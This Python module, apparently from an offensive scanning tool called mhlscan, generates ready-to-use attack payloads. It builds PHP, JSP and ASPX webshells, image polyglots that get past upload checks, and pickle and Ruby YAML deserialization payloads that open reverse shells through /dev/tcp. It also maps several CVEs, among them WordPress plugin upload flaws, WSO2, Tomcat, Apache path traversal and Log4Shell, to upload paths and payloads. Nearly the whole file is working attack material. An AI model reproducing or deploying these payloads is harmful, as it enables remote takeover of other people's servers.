# -*- coding: utf-8 -*-
# GNU GPL License V3
# mhlscan by sigit-hdteamlabs
"""_payload_synth.py - Generate payload spesifik-CVE (tidak auto-execute).

Modul ini hanya menyiapkan string payload. Caller yang memutuskan
apakah akan deploy atau tidak. Tidak ada network request.
"""

import base64
import random
import string


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _b64(s):
    return base64.b64encode(s.encode()).decode()


# =========================================================
# PHP WEBSHELL
# =========================================================
def php_webshell(param=None):
    param = param or _rand(6)
    return {
        "type": "php",
        "param": param,
        "payload": f'<?php system($_GET["{param}"]); ?>',
        "filename": f"mhl_{_rand(6)}.php",
        "note": "Upload ke direktori writable",
    }


def php_png_polyglot(param=None):
    """PNG header + PHP code (bypass check gambar sederhana)."""
    param = param or _rand(6)
    png_header = b'\x89PNG\r\n\x1a\n'
    php_code = f'<?php system($_GET["{param}"]); ?>'.encode()
    content = png_header + php_code
    return {
        "type": "php-polyglot",
        "param": param,
        "payload_bytes": content,
        "filename": f"mhl_{_rand(6)}.png.php",
        "note": "Bypass validasi header file gambar",
    }


def php_gif_polyglot(param=None):
    param = param or _rand(6)
    gif_header = b'GIF89a'
    php_code = f'<?php system($_GET["{param}"]); ?>'.encode()
    content = gif_header + php_code
    return {
        "type": "php-gif-polyglot",
        "param": param,
        "payload_bytes": content,
        "filename": f"mhl_{_rand(6)}.gif.php",
        "note": "Bypass GIF validation",
    }


# =========================================================
# JSP WEBSHELL
# =========================================================
def jsp_webshell(param=None):
    """Untuk Tomcat/JBoss/WSO2 file upload."""
    import _shell
    jsp, p, title = _shell.make_random_shell()
    return {
        "type": "jsp",
        "param": p,
        "payload": jsp,
        "filename": f"mhl_{_rand(6)}.jsp",
        "note": "Upload ke webapps ROOT atau deploy directory",
    }


def jsp_war_payload():
    """WAR payload untuk Tomcat/JBoss deploy."""
    jsp, p, title = _shell.make_random_shell()
    # Minimalist WAR (zip) - bisa di-extend dengan zipfile
    return {
        "type": "war",
        "param": p,
        "payload": None,  # caller yang buat WAR
        "filename": f"mhl_{_rand(6)}.war",
        "note": "Buat WAR dengan zipfile, berisi jsp shell",
        "jsp_content": jsp,
    }


# =========================================================
# ASPX WEBSHELL (untuk IIS/ASP.NET)
# =========================================================
def aspx_webshell(param=None):
    param = param or _rand(6)
    aspx = (
        '<%@ Page Language="C#" %>'
        '<%@ Import Namespace="System.Diagnostics" %>'
        '<script runat="server">'
        f'void Page_Load() {{ if (Request["{param}"] != null) {{'
        f'Process p = new Process(); p.StartInfo.FileName = "cmd.exe";'
        f'p.StartInfo.Arguments = "/c " + Request["{param}"];'
        f'p.StartInfo.UseShellExecute = false;'
        f'p.StartInfo.RedirectStandardOutput = true;'
        f'p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit();'
        '} }'
        '</script>'
    )
    return {
        "type": "aspx",
        "param": param,
        "payload": aspx,
        "filename": f"mhl_{_rand(6)}.aspx",
        "note": "Untuk IIS/ASP.NET file upload",
    }


# =========================================================
# PYTHON / RUBY / NODE
# =========================================================
def python_reverse_pickle(lhost, lport):
    """Python pickle RCE (untuk Django/Flask dengan pickle)."""
    payload = (
        f"cos\nsystem\n(S'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\ntR."
    )
    return {
        "type": "python-pickle",
        "payload": payload.encode(),
        "note": "Untuk Python apps yang deserialize pickle tidak terpercaya",
    }


def ruby_yaml_reverse(lhost, lport):
    """Ruby YAML deserialize."""
    payload = (
        f"--- !ruby/object:Gem::Requirement\nrequirements:\n"
        f"  !ruby/object:Gem::Dependency\n  name: bash\n"
        f"  requirement: !ruby/object:Gem::Requirement\n"
        f"    requirements: !ruby/object:Gem::List\n"
        f"      requirements:\n      - !ruby/object:Gem::Requirement\n"
        f"        requirements: []\n      version: \"&4 bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\n"
    )
    return {
        "type": "ruby-yaml",
        "payload": payload,
        "note": "Untuk Rails YAML.load tidak terpercaya",
    }


# =========================================================
# BY CVE
# =========================================================
CVE_PAYLOAD_MAP = {
    "CVE-2024-5084": lambda: {
        "method": "upload",
        "upload_path": "/wp-admin/admin-ajax.php",
        "param": "qqfile",
        "payload": php_webshell(),
        "note": "Hash Form file upload (WordPress)",
    },
    "CVE-2026-1357": lambda: {
        "method": "upload",
        "upload_path": "/wp-admin/admin-ajax.php",
        "param": "wpvivid_content",
        "payload": php_webshell(),
        "note": "WPvivid AES bypass (encrypted payload)",
    },
    "CVE-2022-29464": lambda: {
        "method": "upload",
        "upload_path": "/fileupload/toolsAny",
        "param": "file",
        "payload": jsp_webshell(),
        "note": "WSO2 arbitrary file upload",
    },
    "CVE-2025-24813": lambda: {
        "method": "put",
        "upload_path": "/uploads/../webapps/ROOT/",
        "payload": jsp_webshell(),
        "note": "Tomcat partial PUT",
    },
    "CVE-2021-42013": lambda: {
        "method": "put",
        "upload_path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
        "payload": php_webshell(),
        "note": "Apache 2.4.49 path traversal RCE",
    },
    "CVE-2021-44228": lambda lhost=None, lport=None: {
        "method": "ldap",
        "param": "jndi:ldap",
        "payload": f"${{jndi:ldap://{lhost or 'LHOST'}:{lport or 'LPORT'}/a}}",
        "note": "Log4Shell — butuh LDAP server (marshalsec)",
    },
}


def synthesize_for_cve(cve_id, lhost=None, lport=None, target_meta=None):
    """Generate payload untuk CVE tertentu. Return dict atau None."""
    fn = CVE_PAYLOAD_MAP.get(cve_id)
    if not fn:
        return None
    try:
        # Coba panggil dengan lhost/lport
        try:
            return fn(lhost=lhost, lport=lport)
        except TypeError:
            return fn()
    except Exception:
        return None


def synthesize_by_stack(stack, os_type="linux"):
    """Generate payload generik berdasarkan stack target."""
    if stack in ("wordpress", "joomla", "drupal", "laravel", "codeigniter"):
        return php_webshell()
    if stack in ("tomcat", "jboss", "wso2"):
        return jsp_webshell()
    if stack in ("aspnet", "iis"):
        return aspx_webshell()
    if os_type == "windows":
        return aspx_webshell()
    return php_webshell()


def list_supported_cves():
    return list(CVE_PAYLOAD_MAP.keys())


def status():
    return {
        "supported_cves": len(CVE_PAYLOAD_MAP),
        "cves": list(CVE_PAYLOAD_MAP.keys()),
        "generators": ["php_webshell", "php_png_polyglot", "php_gif_polyglot",
                       "jsp_webshell", "jsp_war_payload", "aspx_webshell",
                       "python_reverse_pickle", "ruby_yaml_reverse"],
    }
